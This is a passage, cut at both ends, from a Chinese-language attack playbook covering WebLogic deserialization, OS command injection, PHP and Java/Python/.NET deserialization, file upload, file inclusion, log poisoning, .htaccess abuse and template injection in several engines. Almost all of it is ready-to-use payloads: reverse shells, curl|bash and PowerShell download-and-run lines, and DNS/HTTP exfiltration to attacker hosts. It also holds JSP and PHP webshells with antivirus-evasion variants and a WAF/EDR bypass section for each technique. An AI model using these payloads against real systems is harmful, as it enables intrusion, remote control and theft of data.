  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'
```

**3. CVE-2019-2725 反序列化RCE**  _[linux]_
_利用_async端点的反序列化漏洞执行外带验证(OOB)_
```
curl -v "http://target:7001/_async/AsyncResponseService"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
          <void index="0"><string>/bin/bash</string></void>
          <void index="1"><string>-c</string></void>
          <void index="2"><string>curl http://attacker.com/callback?rce=success</string></void>
        </array>
        <void method="start"/>
      </void>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body>
</soapenv:Envelope>'
```

**4. 写入Webshell获取持久权限**  _[linux]_
_利用XMLDecoder的PrintWriter写入JSP webshell到WebLogic部署目录_
```
# 通过XMLDecoder写入JSP Webshell
curl "http://target:7001/wls-wsat/CoordinatorPortType"   -H "Content-Type: text/xml"   -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.io.PrintWriter">
          <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
          <void method="println">
            <string><![CDATA[<%if("test".equals(request.getParameter("pwd"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a=-1;byte[]b=new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%>]]></string>
          </void>
          <void method="close"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'

# 验证Webshell
curl "http://target:7001/bea_wls_internal/test.jsp?pwd=test&cmd=id"
```

**WAF/EDR 绕过变体：**

**1. 备用反序列化端点**
_尝试WebLogic WLS-WSAT组件的多个不同SOAP端点，部分端点可能未被WAF规则覆盖_
```
# 尝试不同的XMLDecoder入口
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType11
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/ParticipantPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationPortTypeRPC
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationRequesterPortType
```

**2. T3/IIOP协议绕过HTTP层WAF**
_使用T3或IIOP协议发送反序列化payload，绕过仅检测HTTP流量的WAF_
```
# T3协议利用（绕过HTTP层WAF）
python3 weblogic_t3_exploit.py -t target:7001 -c "id"

# IIOP协议利用
python3 weblogic_iiop_exploit.py -t target:7001 -c "whoami"

# 使用ysoserial生成T3 payload
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/test" | python3 t3_send.py target 7001
```

**3. XML编码混淆绕过**
_通过XML编码（UTF-16/CDATA/实体编码）混淆payload内容绕过基于内容匹配的WAF_
```
<!-- UTF-16编码绕过 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- CDATA包裹关键字 -->
<java>
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string><![CDATA[/bin/sh]]></string></void>
      <void index="1"><string><![CDATA[-c]]></string></void>
      <void index="2"><string><![CDATA[id]]></string></void>
    </array>
    <void method="start"/>
  </object>
</java>
```

---

### · RCE远程代码执行

### 命令注入  `rce-command-injection`
操作系统命令注入攻击技术
子类：**命令注入** · tags: `rce` `command` `injection` `os`

**前置条件：** 存在系统命令执行功能；用户输入未过滤

**攻击链：**

**1. 1. 探测命令注入**
_探测命令注入点_
```
; id
| id
`id`
$(id)
&& id
|| id
test;id
test|id
```

**2. 2. Linux命令注入**  _[linux]_
_Linux系统命令注入_
```
; whoami
; id
; cat /etc/passwd
; ls -la /
; nc -e /bin/bash attacker.com 4444
; bash -i >& /dev/tcp/attacker/4444 0>&1
```

**3. 3. Windows命令注入**  _[windows]_
_Windows系统命令注入_
```
& whoami
& dir
& type C:\windows\win.ini
& certutil -urlcache -split -f http://attacker/shell.exe shell.exe & shell.exe
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/shell.ps1')"  # security-allowlist: SEC005
```

**4. 4. 盲命令注入**
_盲命令注入探测_
```
; sleep 5
; ping -c 5 attacker.com
& timeout 5
通过响应时间差异判断命令是否执行
```

**5. 5. 外带数据**  _[linux]_
_通过外带通道获取数据_
```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id|base64)
; nslookup $(whoami).attacker.com
; ping $(whoami | xxd -p).attacker.com
```

**WAF/EDR 绕过变体：**

**1. 空格绕过**  _[linux]_
_绕过空格过滤_
```
;{cat,/etc/passwd}
;cat$IFS/etc/passwd
;cat</etc/passwd
;cat%09/etc/passwd
;cat${IFS}/etc/passwd
```

**2. 关键字绕过**  _[linux]_
_绕过关键字过滤_
```
; c''at /etc/passwd
; c""at /etc/passwd
; c\at /etc/passwd
; /bin/c?a?t /etc/passwd
; /bin/ca[t] /etc/passwd
```

**3. 编码绕过**  _[linux]_
_使用编码绕过_
```
; echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash  # security-allowlist: SEC008
; $(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

---

### PHP代码执行  `rce-php`
PHP代码执行漏洞利用技术
子类：**PHP代码执行** · tags: `rce` `php` `code` `execution`

**前置条件：** 存在PHP代码执行点；用户输入可控制代码

**攻击链：**

**1. 1. 常见危险函数**
_PHP危险函数_
```
eval($_POST[cmd]);
assert($_POST[cmd]);
preg_replace('/a/e',$_POST[cmd],'a');
create_function('',$_POST[cmd]);
array_map($_POST[func],$_POST[arr]);
call_user_func($_POST[func],$_POST[arg]);
```

**2. 2. 命令执行**
_PHP命令执行函数_
```
system('whoami');
exec('whoami');
shell_exec('whoami');
passthru('whoami');
popen('whoami','r');
proc_open('whoami',$desc,$pipes);
`whoami`;
```

**3. 3. 一句话木马**
_常见一句话木马_
```
<?php @eval($_POST[cmd]);?>
<?php @assert($_POST[cmd]);?>
<?php @system($_GET[cmd]);?>
<?php $a=create_function('',$_POST[cmd]);$a();?>
```

**4. 4. 免杀一句话**
_免杀一句话木马_
```
<?php $a='ev'.$_POST[1];$a($_POST[cmd]);?>
<?php $_='a'.'s'.'s'.'e'.'r'.'t';$_($_POST[cmd]);?>
<?php $a=base64_decode('YXNzZXJ0');$a($_POST[cmd]);?>
```

**WAF/EDR 绕过变体：**

**1. 回调函数绕过**
_使用回调函数_
```
array_map('assert',array($_POST[cmd]));
call_user_func('assert',$_POST[cmd]);
$a='assert';$a($_POST[cmd]);
```

**2. 变量函数绕过**
_WAF绕过技术_
```
$func=$_GET['func'];$cmd=$_GET['cmd'];$func($cmd);
```

---

### PHP Filter链RCE  `rce-php-filter`
利用PHP Filter链构造RCE
子类：**PHP Filter链** · tags: `rce` `php` `filter` `chain`

**前置条件：** 存在文件包含漏洞；PHP版本支持Filter链

**攻击链：**

**1. 1. Filter链原理**
_Filter链原理_
```
利用php://filter的convert.base64-decode等过滤器
通过精心构造的输入，最终生成可执行代码
```

**2. 2. 构造Filter链**
_构造Filter链_
```
php://filter/convert.base64-decode/resource=data://,plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==
使用多个过滤器串联
```

**3. 3. 使用工具生成**
_使用工具生成Filter链_
```
# 使用php_filter_chain_generator
python3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"

# 输出可直接使用的Filter链
```

**4. 4. 完整利用示例**
_完整Filter链示例_
```
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码组合绕过_
```
使用不同编码过滤器组合
绕过关键字检测
```

---

### 盲命令注入  `rce-cmd-blind`
无回显的命令注入利用技术
子类：**盲命令注入** · tags: `rce` `blind` `command` `injection`

**前置条件：** 存在命令注入点；无直接回显

**攻击链：**

**1. 1. 时间盲注**
_使用延时判断_
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& timeout 5
观察响应时间判断命令是否执行
```

**2. 2. DNS外带**
_DNS外带数据_
```
; nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
; host $(id | base64).attacker.com
& nslookup %USERNAME%.attacker.com
```

**3. 3. HTTP外带**
_HTTP外带数据_
```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id)
; curl -d @/etc/passwd http://attacker.com/
& certutil -urlcache -f http://attacker.com/?data=%USERNAME%
```

**4. 4. ICMP外带**  _[linux]_
_ICMP外带数据_
```
; ping -p $(echo "test" | xxd -p) attacker.com
; tcpdump -i eth0 icmp
在攻击者服务器监听ICMP包
```

**5. 5. 反弹Shell**
_反弹Shell_
```
; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
; nc -e /bin/bash attacker 4444
; python -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**  _[linux]_
_Base64编码绕过_
```
; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash  # security-allowlist: SEC008
使用Base64编码绕过
```

---

### 反序列化漏洞  `rce-deserialize`
利用反序列化漏洞实现RCE
子类：**反序列化** · tags: `rce` `deserialize` `java` `php`

**前置条件：** 存在反序列化点；存在可利用的Gadget链

**攻击链：**

**1. 1. Java反序列化**
_Java反序列化_
```
# 常见漏洞组件
Apache Commons Collections
Spring Framework
Fastjson
Jackson
WebLogic

# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash"  # security-allowlist: curl-pipe-bash
```

**2. 2. PHP反序列化**
_PHP反序列化_
```
<?php
class Exploit {
    public $cmd = "system('whoami');";
    function __destruct() {
        eval($this->cmd);
    }
}
echo serialize(new Exploit());
?>
生成: O:6:"Exploit":1:{s:3:"cmd";s:17:"system('whoami');";}
```

**3. 3. Python反序列化**
_Python pickle反序列化_
```
import pickle
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
payload = pickle.dumps(Exploit())
# 发送payload触发反序列化
```

**4. 4. .NET反序列化**  _[windows]_
_.NET反序列化_
```
# 使用ysoserial.net
ysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"

# 常见格式
BinaryFormatter
Json.NET
XMLSerializer
```

**WAF/EDR 绕过变体：**

**1. 签名绕过**
_绕过签名验证_
```
如果存在签名验证
需要获取密钥重新签名
```

---

### PHP反序列化  `rce-deserialize-php`
PHP反序列化漏洞利用技术
子类：**PHP反序列化** · tags: `rce` `php` `deserialize` `unserialize`

**前置条件：** 存在unserialize调用；存在可利用的类

**攻击链：**

**1. 1. 魔术方法**
_PHP魔术方法_
```
__construct() - 对象创建时调用
__destruct() - 对象销毁时调用
__wakeup() - 反序列化时调用
__toString() - 对象转字符串时调用
__call() - 调用不存在方法时触发
```

**2. 2. 构造POP链**
_构造POP链_
```
<?php
class Chain {
    public $obj;
    function __destruct() {
        $this->obj->action();
    }
}
class Action {
    public $cmd;
    function action() {
        system($this->cmd);
    }
}
$payload = new Chain();
$payload->obj = new Action();
$payload->obj->cmd = "whoami";
echo serialize($payload);
?>
```

**3. 3. Phar反序列化**
_Phar反序列化_
```
# 生成Phar文件
<?php
class Exploit {}
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>

# 触发反序列化
phar://exploit.phar/test.txt
```

**4. 4. Session反序列化**
_Session反序列化_
```
# 利用Session处理器差异
# php_serialize vs php_binary
构造恶意Session数据触发反序列化
```

**WAF/EDR 绕过变体：**

**1. 属性修饰符绕过**
_属性修饰符处理_
```
使用public/private/protected属性
注意序列化格式差异:
public: s:3:"cmd"
private: s:8:"\0Class\0cmd"
protected: s:7:"\0*\0cmd"
```

---

### Java反序列化  `rce-deserialize-java`
Java反序列化漏洞利用技术
子类：**Java反序列化** · tags: `rce` `java` `deserialize` `ysoserial`

**前置条件：** 存在Java反序列化点；存在Gadget链

**攻击链：**

**1. 1. 常见Gadget链**
_常见Gadget链_
```
CommonsCollections - Apache Commons Collections
CommonsBeanutils - Apache Commons BeanUtils
Spring - Spring Framework
Jdk7u21 - JDK原生Gadget
Groovy - Apache Groovy
Hibernate - Hibernate ORM
```

**2. 2. 使用ysoserial**
_使用ysoserial生成payload_
```
# 列出所有Gadget
java -jar ysoserial.jar

# 生成payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash" > payload.ser  # security-allowlist: curl-pipe-bash
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

**3. 3. JRMP攻击**
_JRMP攻击_
```
# 启动JRMP服务
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "touch /tmp/pwned"

# 发送JRMP客户端payload
java -jar ysoserial.jar JRMPClient attacker:4444
```

**4. 4. 内存马注入**
_内存马注入_
```
# 使用ysoserial注入内存马
java -jar ysoserial.jar CommonsCollections1 "生成内存马字节码"

# 或使用工具
java -jar ysuserial.jar CommonsCollections1 "内存马命令"
```

**WAF/EDR 绕过变体：**

**1. 二次反序列化**
_二次反序列化绕过_
```
使用SignedObject或RMI绕过黑名单
```

**2. 反射绕过**
_反射绕过_
```
使用反射设置属性绕过限制
```

---

### 文件上传漏洞  `rce-file-upload`
利用文件上传漏洞获取RCE
子类：**文件上传** · tags: `rce` `upload` `webshell` `file`

**前置条件：** 存在文件上传功能；可上传可执行文件

**攻击链：**

**1. 1. 基础上传**
_直接上传可执行文件_
```
上传PHP文件: shell.php
上传JSP文件: shell.jsp
上传ASPX文件: shell.aspx
上传CGI文件: shell.cgi
```

**2. 2. 前端绕过**
_绕过前端验证_
```
# 修改Content-Type
Content-Type: image/jpeg

# 修改文件扩展名
test.php -> test.jpg.php
test.php -> test.php.jpg

# 使用空字节
test.php%00.jpg
```

**3. 3. 后端绕过**
_绕过后端黑名单_
```
# 黑名单绕过
.php -> .phtml, .php3, .php5, .pht
.asp -> .asa, .cer, .cdx
.jsp -> .jspx, .jspf

# 大小写绕过
.Php, .pHp, .PHP

# 双写绕过
.pphphp
```

**4. 4. 图片马**
_制作图片马_
```
# 制作图片马
copy test.jpg/b + shell.php/a shell.jpg

# 利用文件包含执行
include($_GET['file']);
?file=upload/shell.jpg
```

**5. 5. .htaccess上传**  _[linux]_
_利用.htaccess_
```
# 上传.htaccess文件
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# 之后上传的jpg文件会被当作PHP执行
```

**WAF/EDR 绕过变体：**

**1. Content-Type绕过**
_Content-Type绕过_
```
修改请求中的Content-Type为允许的类型
image/jpeg, image/png, image/gif
```

**2. 文件头绕过**
_文件头绕过_
```
在恶意文件前添加图片文件头
GIF89a<?php eval($_POST[cmd]);?>
```

---

### 文件包含RCE  `rce-include`
利用文件包含漏洞实现RCE
子类：**文件包含** · tags: `rce` `include` `lfi` `rfi`

**前置条件：** 存在文件包含漏洞；可包含恶意文件

**攻击链：**

**1. 1. 日志投毒**  _[linux]_
_日志投毒RCE_
```
# 注入代码到日志
User-Agent: <?php system($_GET['cmd']);?>

# 包含日志文件
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/nginx/access.log&cmd=whoami
```

**2. 2. Session文件包含**  _[linux]_
_Session文件包含_
```
# 注入代码到Session
?file=/var/lib/php/sessions/sess_[PHPSESSID]

# Session内容
<?php system($_GET['cmd']);?>
```

**3. 3. /proc/self/environ**  _[linux]_
_包含环境变量_
```
# 注入代码到环境变量
User-Agent: <?php system($_GET['cmd']);?>

# 包含环境变量文件
?file=/proc/self/environ&cmd=whoami
```

**4. 4. PHP伪协议**
_PHP伪协议利用_
```
# php://input
?file=php://input
POST: <?php system('whoami');?>

# data://协议
?file=data://text/plain,<?php system('whoami');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
```

**5. 5. 远程文件包含**
```
# RFI直接包含远程Shell
?file=http://attacker.com/shell.txt

# shell.txt内容
<?php system($_GET['cmd']);?>
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_URL编码绕过_
```
?file=%2fvar%2flog%2fapache2%2faccess.log
URL编码路径
```

---

### 日志投毒RCE  `rce-log-poison`
利用日志投毒实现RCE
子类：**日志投毒** · tags: `rce` `log` `poison` `lfi`

**前置条件：** 存在文件包含漏洞；可读取日志文件

**攻击链：**

**1. 1. Apache日志投毒**  _[linux]_
_Apache日志投毒_
```
# 注入代码到访问日志
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# 包含日志执行
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/httpd/access_log&cmd=whoami
```

**2. 2. Nginx日志投毒**
```
# 注入代码
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# 包含日志
?file=/var/log/nginx/access.log&cmd=whoami
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
使用URL编码或Base64编码绕过关键字过滤
```

---

### 图片马RCE  `rce-image`
利用图片马实现RCE
子类：**图片马** · tags: `rce` `image` `webshell` `upload`

**前置条件：** 存在文件上传；存在文件包含

**攻击链：**

**1. 1. 制作图片马**
_制作图片马_
```
# Windows
copy test.jpg/b + shell.php/a shell.jpg

# Linux
cat test.jpg shell.php > shell.jpg

# 在图片末尾添加PHP代码
echo "<?php @eval($_POST[cmd]);?>" >> test.jpg
```

**2. 2. 图片马内容**
_图片马格式_
```
GIF89a
<?php @eval($_POST[cmd]);?>

# 或使用Exif注释
exiftool -Comment="<?php @eval($_POST[cmd]);?>" test.jpg
```

**3. 3. 利用文件包含执行**
_文件包含执行_
```
# 配合文件包含漏洞
?file=upload/shell.jpg
POST: cmd=system('whoami');

# 配合phar://
?file=phar://upload/shell.jpg
```

**4. 4. 配合.htaccess**  _[linux]_
_配合.htaccess执行_
```
# 上传.htaccess
AddType application/x-httpd-php .jpg

# 直接访问图片执行
http://target/upload/shell.jpg
```

**WAF/EDR 绕过变体：**

**1. 文件头伪装**
_文件头伪装_
```
使用真实图片文件头
确保图片可正常预览
```

---

### .htaccess利用  `rce-htaccess`
利用.htaccess文件实现RCE
子类：**.htaccess** · tags: `rce` `htaccess` `apache` `upload`

**前置条件：** Apache服务器；可上传.htaccess

**攻击链：**

**1. 1. 解析其他扩展名**  _[linux]_
_修改文件类型解析_
```
# 让.jpg文件作为PHP执行
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# 让.txt文件作为PHP执行
AddType application/x-httpd-php .txt
```

**2. 2. 自动包含**  _[linux]_
_自动包含文件_
```
# 自动在每个文件前包含
php_value auto_prepend_file /var/www/html/shell.php

# 自动在每个文件后包含
php_value auto_append_file /var/www/html/shell.php
```

**3. 3. 伪静态RCE**  _[linux]_
_伪静态配置_
```
# 利用mod_rewrite
RewriteEngine on
RewriteRule ^(.*)$ $1 [L]

# 更危险的配置
SetHandler application/x-httpd-php
```

**4. 4. 错误页面包含**  _[linux]_
_错误页面利用_
```
# 自定义错误页面
ErrorDocument 404 /shell.php
ErrorDocument 500 /shell.php
```

**5. 5. 文件包含绕过**  _[linux]_
_PHP配置修改_
```
# 设置include路径
php_value include_path "/var/www/html/uploads"

# 禁用安全限制
php_flag safe_mode off
php_flag display_errors on
```

**WAF/EDR 绕过变体：**

**1. 换行绕过**  _[linux]_
_换行绕过_
```
使用换行符分隔配置
绕过单行检测
```

---

### · SSTI模板注入

### Jinja2模板注入  `ssti-jinja2`
Jinja2/Twig模板注入攻击技术
子类：**Jinja2** · tags: `ssti` `jinja2` `twig` `template`

**前置条件：** 使用Jinja2/Twig模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测模板注入_
```
{{7*7}}
${7*7}
<%= 7*7 %>
{{config}}
如果输出49或配置信息，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
{{config}}
{{self}}
{{request}}
{{"".__class__.__mro__}}
{{"".__class__.__mro__[1].__subclasses__()}}
```

**3. 3. 命令执行**
_执行系统命令_
```
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**4. 4. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"').read()}}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
{{''['__cla'+'ss__']}}
{{''|attr('__cla'+'ss__')}}
{{''|attr('\x5f\x5fcla\x5f\x5fss')}}
```

**2. 使用request对象**
_通过request参数传递_
```
{{request|attr(request.args.a)}}&a=__class__
{{request|attr(request.args.a)|attr(request.args.b)}}&a=__class__&b=__mro__
```

---

### FreeMarker模板注入  `ssti-freemarker`
FreeMarker模板引擎注入攻击技术
子类：**FreeMarker** · tags: `ssti` `freemarker` `java` `template`

**前置条件：** 使用FreeMarker模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测FreeMarker模板注入_
```
${7*7}
${"freemarker"}
<#assign ex="freemarker">
如果输出49或freemarker，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
${.version}
${.current_template_name}
${.lang}
${system_property["java.version"]}
${system_property["os.name"]}
```

**3. 3. 命令执行 - new**
_使用Execute类执行命令_
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

**4. 4. 命令执行 - api**
_使用ObjectConstructor执行命令_
```
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.Runtime","getRuntime").exec("id")}
<#assign api="freemarker.template.utility.ObjectConstructor"?new()>${api("java.lang.ProcessBuilder","/bin/sh","-c","id").start()}
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
<#assign ex="freemarker.template.utility.Ex"+"ecute"?new()>${ex("id")}
<#assign cls="java.lang.Ru"+"ntime">${cls?new().exec("id")}
```

**2. 使用内置函数**
_直接实例化执行_
```
${"freemarker.template.utility.Execute"?new()("id")}
${"java.lang.Runtime"?new().exec("id")}
```

---

### Velocity模板注入  `ssti-velocity`
Velocity模板引擎注入攻击技术
子类：**Velocity** · tags: `ssti` `velocity` `java` `template`

**前置条件：** 使用Velocity模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Velocity模板注入_
```
#set($x=7*7)$x
$velocityVersion
$class.inspect("java.lang.Runtime")
如果输出49或版本信息，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
$class.inspect("java.lang.System")
$class.inspect("java.lang.Runtime")
$sys.class.forName("java.lang.Runtime")
```

**3. 3. 命令执行 - ClassTool**
_使用ClassTool执行命令_
```
#set($rt=$class.inspect("java.lang.Runtime"))
#set($chr=$class.inspect("java.lang.Character"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($is=$ex.getInputStream())
#set($br=$class.inspect("java.io.BufferedReader").newInstance($class.inspect("java.io.InputStreamReader").newInstance($is)))
#set($line=$br.readLine())
$line
```

**4. 4. 命令执行 - 反射**
_使用反射执行命令_
```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"id"))
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
#set($rt=$Class.forName("java.lang.Runtime"))
#set($m=$rt.getDeclaredMethod("getRuntime"))
#set($obj=$m.invoke(null))
#set($ex=$rt.getDeclaredMethod("exec",$Class.forName("java.lang.String")).invoke($obj,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"))
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
#set($cmd="i"+"d")
#set($rt=$Class.forName("java.lang.Ru"+"ntime"))
#set($ex=$rt.getRuntime().exec($cmd))
```

**2. 使用Unicode**
_使用Unicode编码绕过_
```
#set($cmd="id")
#set($rt=$Class.forName("java.lang.Runtime"))
#set($ex=$rt.getRuntime().exec($cmd))
```

---

### Thymeleaf模板注入  `ssti-thymeleaf`
Thymeleaf模板引擎注入攻击技术
子类：**Thymeleaf** · tags: `ssti` `thymeleaf` `java` `spring` `template`

**前置条件：** 使用Thymeleaf模板引擎；Spring框架；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Thymeleaf模板注入_
```
${7*7}
#{7*7}
*{7*7}
[[${7*7}]]
如果输出49，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Class).forName("java.lang.Runtime")}
```

**3. 3. 命令执行 - Spring表达式**
_使用Spring表达式执行命令_
```
${T(java.lang.Runtime).getRuntime().exec("id")}
${T(java.lang.Runtime).getRuntime().exec("whoami")}
${T(java.lang.ProcessBuilder).newInstance("id").start()}
```

**4. 4. 命令执行 - ProcessBuilder**
_使用ProcessBuilder执行命令_
```
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"bash","-c","id"}).start()}
${new java.lang.ProcessBuilder(new String[]{"cmd","/c","whoami"}).start()}
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
${T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}")}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
${T(java.lang.Run"+"time).getRuntime().exec("i"+"d")}
${T(java.lang.Class).forName("java.lang.Ru"+"ntime").getMethod("getRuntime").invoke(null)}
```

**2. 使用反射**
_使用反射绕过_
```
${T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Runtime).getRuntime(),"id")}
```

**3. URL编码**
_使用字节数组绕过_
```
${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{105,100}))}
# 使用字节数组构造命令
```

---

### Smarty模板注入  `ssti-smarty`
Smarty模板引擎注入攻击技术
子类：**Smarty** · tags: `ssti` `smarty` `php` `template`

**前置条件：** 使用Smarty模板引擎；用户输入直接渲染到模板

**攻击链：**

**1. 1. 探测SSTI**
_探测Smarty模板注入_
```
{$smarty.version}
{7*7}
{$smarty.template}
如果输出版本或49，则存在SSTI
```

**2. 2. 信息收集**
_收集环境信息_
```
{$smarty.server.PHP_SELF}
{$smarty.server.SERVER_NAME}
{$smarty.const.PHP_VERSION}
```

**3. 3. 命令执行 - system**
_使用system函数执行命令_
```
{system("id")}
{system("whoami")}
{system("cat /etc/passwd")}
```

**4. 4. 命令执行 - passthru**
_使用passthru函数执行命令_
```
{passthru("id")}
{passthru("ls -la")}
{passthru("cat /etc/passwd")}
```

**5. 5. 命令执行 - exec**
_使用exec函数执行命令_
```
{exec("id",$output)}
{foreach from=$output item=line}{$line}{/foreach}
```

**6. 6. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
{system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")}
{system("nc -e /bin/sh attacker 4444")}
```

**WAF/EDR 绕过变体：**

**1. 字符串拼接**
_使用字符串拼接绕过_
```
{system("i"+"d")}
{system("who"."ami")}
{system("ca"."t /etc/passwd")}
```

**2. 变量赋值**
_使用变量赋值绕过_
```
{assign var="cmd" value="id"}
{system($cmd)}
{assign var="f" value="sys"."tem"}
{$f("id")}
```

**3. 使用PHP函数**
_WAF绕过技术_
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{PHP function call}
```

---

### Mako模板注入  `ssti-mako`
Mako模板引擎注入攻击技术
子类：**Mako** · tags: `ssti` `mako` `python` `template`

